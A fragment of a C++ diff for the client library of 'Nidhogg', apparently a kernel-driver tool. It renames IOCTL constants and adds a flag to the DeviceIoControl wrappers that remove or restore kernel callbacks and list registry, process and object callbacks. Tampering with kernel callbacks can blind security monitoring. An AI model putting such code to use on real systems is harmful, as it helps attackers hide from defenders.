 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
@@ -1113,8 +1141,9 @@ namespace Nidhogg {
 
 			callback.CallbackAddress = callbackAddress;
 			callback.Type = callbackType;
+			callback.Remove = false;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_RESTORE_CALLBACK,
+			if (!DeviceIoControl(hNidhogg, IOCTL_REMOVE_RESTORE_CALLBACK,
 				&callback, sizeof(callback),
 				nullptr, 0, &returned, nullptr))
 				return NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
@@ -1133,7 +1162,7 @@ namespace Nidhogg {
 			}
 			memset(callbacks.Callbacks, 0, MAX_ROUTINES * sizeof(PsRoutine));
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_LIST_REGCALLBACKS,
+			if (!DeviceIoControl(hNidhogg, IOCTL_LIST_REGCALLBACKS,
 				&callbacks, sizeof(callbacks),
 				&callbacks, sizeof(callbacks), &returned, nullptr)) {
 				*success = NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
@@ -1156,7 +1185,7 @@ namespace Nidhogg {
 			}
 			memset(routines.Routines, 0, MAX_ROUTINES * sizeof(PsRoutine));
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_LIST_PSROUTINES,
+			if (!DeviceIoControl(hNidhogg, IOCTL_LIST_PSROUTINES,
 				&routines, sizeof(routines),
 				&routines, sizeof(routines), &returned, nullptr)) {
 				*success = NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
@@ -1174,7 +1203,7 @@ namespace Nidhogg {
 			callbacks.NumberOfCallbacks = 0;
 			callbacks.Type = callbackType;
 
-			if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_LIST_OBCALLBACKS,
+			if (!DeviceIoControl(hNidhogg, IOCTL_LIST_OBCALLBACKS,
 				&callbacks, sizeof(callbacks),
 				&callbacks, sizeof(callbacks), &returned, nullptr)) {
 				*success = NIDHOGG_ERROR_DEVICECONTROL_DRIVER;
@@ -1197,7 +1226,7 @@ namespace Nidhogg {
 						break;
 					}
 
-					if (!DeviceIoControl(hNidhogg, IOCTL_NIDHOGG_LIST_OBCALLBACKS,
+					if (!DeviceIoControl(hNidhogg, IOCTL_LIST_OBCALLBACKS,
 						&callbacks, sizeof(callbacks),
 						&callbacks, sizeof(callbacks), &returned, nullptr)) {
 						free(callbacks.Callbacks);
